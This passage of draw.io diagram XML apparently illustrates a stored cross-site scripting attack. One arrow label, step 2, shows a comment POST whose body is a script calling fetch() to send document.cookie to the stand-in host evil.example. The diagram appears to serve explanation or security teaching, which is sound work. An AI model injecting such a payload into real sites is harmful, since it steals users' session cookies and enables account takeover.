                </mxCell>
                <mxCell id="m2" value="② POST /comment   body = &lt;script&gt;fetch(&quot;https://evil.example/steal?c=&quot;+document.cookie)&lt;/script&gt;" style="html=1;verticalAlign=bottom;endArrow=block;endFill=1;strokeColor=#333333;fontSize=11;" parent="1" edge="1">
